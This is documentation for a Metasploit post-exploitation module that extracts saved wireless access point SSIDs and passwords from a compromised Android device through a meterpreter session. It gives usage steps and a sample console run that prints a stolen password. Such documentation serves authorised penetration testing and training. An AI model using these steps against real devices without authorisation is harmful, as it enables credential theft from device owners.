## Vulnerable Application

  This post-exploitation module will extract saved wireless AccessPoint
  credentials from the target device.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use android/gather/wireless_ap`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see the extracted bssids and passwords of wireless
     APs

## Options

  - **SESSION** - The session to run the module on.

## Extracted data

  - Wireless AP creds

## Example Scenario


  ```
  msf5 exploit(multi/handler) > use post/android/gather/wireless_ap
msf5 post(android/gather/wireless_ap) > set session 1
session => 1
msf5 post(android/gather/wireless_ap) > run

[!] SESSION may not be compatible with this module.
Wireless APs
============

 SSID                  net_type  password
 ----                  --------  --------
 ADYYYXRoYXJ2YWpvc2hp  WPS       lkjhgfdsa


[*] Post module execution completed
msf5 post(android/gather/wireless_ap) >
  ```
